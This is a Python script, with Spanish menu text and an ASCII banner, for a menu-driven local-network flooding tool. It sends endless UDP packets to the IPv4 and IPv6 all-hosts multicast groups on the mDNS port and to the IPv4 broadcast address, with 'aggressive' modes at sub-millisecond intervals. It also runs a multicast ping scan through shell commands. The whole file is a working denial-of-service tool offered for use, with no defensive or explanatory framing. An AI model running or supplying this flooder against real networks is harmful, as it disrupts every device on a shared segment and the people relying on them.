import socket
import time
import threading
import os
import struct
import sys

def flood_ipv4(aggressive=False):
    group = '224.0.0.1'
    port = 5353
    message = b'MULTICAST IPv4 FLOOD - Hello network!'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    delay = 0.0001 if aggressive else 0.001
    print(f"[+] Enviando a {group}:{port} con delay {delay}s")
    while True:
        sock.sendto(message, (group, port))
        time.sleep(delay)

def flood_ipv6(aggressive=False):
    group = 'ff02::1'
    port = 5353
    message = b'MULTICAST IPv6 FLOOD - Hello network!'
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 2)
    delay = 0.0001 if aggressive else 0.001
    try:
        iface = os.popen("ip route | grep default | awk '{print $5}'").read().strip()
    except:
        iface = "eth0"
    print(f"[+] Enviando a {group}%{iface}:{port} con delay {delay}s")
    while True:
        try:
            sock.sendto(message, (f"{group}%{iface}", port))
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(delay)

def flood_broadcast(aggressive=False):
    broadcast_ip = '255.255.255.255'
    port = 9999
    message = b'BROADCAST FLOOD - Wake up everyone!'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    delay = 0.0001 if aggressive else 0.001
    print(f"[+] Enviando a {broadcast_ip}:{port} con delay {delay}s")
    while True:
        sock.sendto(message, (broadcast_ip, port))
        time.sleep(delay)

def multicast_ping_scan():
    print("[*] Enviando pings multicast ICMP para ver quién responde...")
    iface = os.popen("ip route | grep default | awk '{print $5}'").read().strip()
    os.system(f"ping -I {iface} -c 5 224.0.0.1")

def main():
    print("""

 ███████╗██╗      ██████╗  ██████╗ ██████╗  ██████╗ █████╗ ███████╗████████╗
██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝
█████╗  ██║     ██║   ██║██║   ██║██║  ██║██║     ███████║███████╗   ██║   
██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║██║     ██╔══██║╚════██║   ██║   
██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝╚██████╗██║  ██║███████║   ██║   
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
                                                                                                                                                                 
=======================================================================

 [1] Flood IPv4 multicast (standard)
 [2] Flood IPv4 multicast (aggressive)
 [3] Flood IPv6 multicast (standard)
 [4] Flood IPv6 multicast (aggressive)
 [5] Flood IPv4 broadcast (standard)
 [6] Flood IPv4 broadcast (aggressive)
 [7] Escanear hosts con ping multicast (IPv4)
 [0] Salir
    """)

    choice = input("Elige una opción: ").strip()

    if choice == "1":
        flood_ipv4(aggressive=False)
    elif choice == "2":
        flood_ipv4(aggressive=True)
    elif choice == "3":
        flood_ipv6(aggressive=False)
    elif choice == "4":
        flood_ipv6(aggressive=True)
    elif choice == "5":
        flood_broadcast(aggressive=False)
    elif choice == "6":
        flood_broadcast(aggressive=True)
    elif choice == "7":
        multicast_ping_scan()
    elif choice == "0":
        print("¡Hasta luego, Kido!")
        exit(0)
    else:
        print("Opción inválida.")
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario.")

